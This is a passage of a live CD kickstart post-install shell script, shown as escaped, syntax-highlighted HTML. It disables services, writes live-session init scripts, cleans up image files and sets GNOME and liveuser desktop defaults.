default\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl --no-reload disable mdmonitor.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl --no-reload disable mdmonitor-takeover.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl stop mdmonitor.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl stop mdmonitor-takeover.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# don\u0026#39;t enable the gnome-settings-daemon packagekit plugin\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003egsettings set org.gnome.settings-daemon.plugins.updates active \u0026#39;false\u0026#39; || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# don\u0026#39;t start cron/at as they tend to spawn things which are\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# disk intensive that are painful on a live image\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl --no-reload disable crond.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl --no-reload disable atd.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl stop crond.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl stop atd.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Mark things as configured\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003etouch /.liveimg-configured\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# add static hostname to work around xauth bug\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# https://bugzilla.redhat.com/show_bug.cgi?id=679486\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eecho \u0026#34;localhost\u0026#34; \u0026gt; /etc/hostname\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Fixing the lang install issue when other lang than English is selected . See http://bugs.centos.org/view.php?id=7217\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/usr/bin/cp /usr/lib/python2.7/site-packages/blivet/size.py /usr/lib/python2.7/site-packages/blivet/size.py.orig\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/usr/bin/sed -i \u0026#34;s#return self.humanReadable()#return self.humanReadable().encode(\u0026#39;utf-8\u0026#39;)#g\u0026#34; /usr/lib/python2.7/site-packages/blivet/size.py\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# bah, hal starts way too late\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecat \u0026gt; /etc/rc.d/init.d/livesys-late \u0026lt;\u0026lt; EOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#!/bin/bash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# live: Late init script for live image\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# chkconfig: 345 99 01\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# description: Late init script for live image.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e. /etc/init.d/functions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; rd.live.image || [ \u0026#34;\\$1\u0026#34; !\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;start\u0026#34; ] || [ -e /.liveimg-late-configured ] ; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    exit 0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eexists() {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003ewhich \\$1 \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 || return\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\\$*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003etouch /.liveimg-late-configured\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# read some variables out of /proc/cmdline\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efor o in \\`cat /proc/cmdline\\` ; do\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003ecase \\$o in\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eks\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e*)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        ks=\u0026#34;--kickstart=\\${o#ks=}\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        ;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    xdriver=*)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        xdriver=\u0026#34;\\${o#xdriver=}\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        ;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    esac\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# if liveinst or textinst is given, start anaconda\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; liveinst ; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"na\"\u003eplymouth --quit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"na\"\u003e/usr/sbin/liveinst \\$ks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; textinst ; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"na\"\u003eplymouth --quit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"na\"\u003e/usr/sbin/liveinst --text \\$ks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# configure X, allowing user to override xdriver\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif [ -n \u0026#34;\\$xdriver\u0026#34; ]; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"na\"\u003ecat \u0026gt; /etc/X11/xorg.conf.d/00-xdriver.conf \u0026lt;\u0026lt;FOE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eSection \u0026#34;Device\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003eIdentifier      \u0026#34;Videocard0\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003eDriver  \u0026#34;\\$xdriver\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eEndSection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eFOE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echmod 755 /etc/rc.d/init.d/livesys\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/sbin/restorecon /etc/rc.d/init.d/livesys\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/sbin/chkconfig --add livesys\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echmod 755 /etc/rc.d/init.d/livesys-late\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/sbin/restorecon /etc/rc.d/init.d/livesys-late\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/sbin/chkconfig --add livesys-late\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# enable tmpfs for /tmp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl enable tmp.mount\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# enable docker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl enable docker.service\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# work around for poor key import UI in PackageKit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erm -f /var/lib/rpm/__db*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ereleasever\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e$(rpm -q --qf \u0026#39;%{version}\\n\u0026#39; --whatprovides system-release)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebasearch\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e$(uname -i)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-fedora-$releasever-$basearch\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eecho \u0026#34;Packages within this LiveCD\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erpm -qa\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Note that running rpm recreates the rpm db files which aren\u0026#39;t needed or wanted\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erm -f /var/lib/rpm/__db*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# go ahead and pre-make the man -k cache (#455968)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/usr/bin/mandb\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# save a little bit of space at least...\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erm -f /boot/initramfs*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# make sure there aren\u0026#39;t core files lying around\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erm -f /core*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# convince readahead not to collect\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# FIXME: for systemd\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecat \u0026gt;\u0026gt; /etc/rc.d/init.d/livesys \u0026lt;\u0026lt; EOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# disable updates plugin\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecat \u0026gt;\u0026gt; /usr/share/glib-2.0/schemas/org.gnome.settings-daemon.plugins.updates.gschema.override \u0026lt;\u0026lt; FOE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e[org.gnome.settings-daemon.plugins.updates]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eactive\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eFOE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Show the system-config-keyboard tool on the desktop\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003emkdir /home/liveuser/Desktop -p \u0026gt;/dev/null\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecat /usr/share/applications/system-config-keyboard.desktop | sed \u0026#39;/NotShowIn/d\u0026#39; |sed \u0026#39;s/Terminal\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003efalse/Terminal=true/\u0026#39; \u0026gt; /home/liveuser/Desktop/system-config-keyboard.desktop\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecat /usr/share/applications/liveinst.desktop | sed \u0026#39;/NoDisplay/d\u0026#39; \u0026gt; /home/liveuser/Desktop/liveinst.desktop \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echmod +x /home/liveuser/Desktop/*.desktop\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echown -R liveuser:liveuser /home/liveuser\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Liveuser face\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif [ -e /usr/share/icons/hicolor/96x96/apps/fedora-logo-icon.png ] ; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003ecp /usr/share/icons/hicolor/96x96/apps/fedora-logo-icon.png /home/liveuser/.face\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003echown liveuser:liveuser /home/liveuser/.face\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# make the installer show up\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif [ -f /usr/share/applications/liveinst.desktop ]; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# Show harddisk install in shell dash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003esed -i -e \u0026#39;s/NoDisplay\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003etrue/NoDisplay=false/\u0026#39; /usr/share/applications/liveinst.desktop \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  # need to move it to anaconda.desktop to make shell happy\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  #cp /usr/share/applications/liveinst.desktop /usr/share/applications/anaconda.desktop\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003ecat \u0026gt;\u0026gt; /usr/share/glib-2.0/schemas/org.gnome.shell.gschema.override \u0026lt;\u0026lt; FOE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan 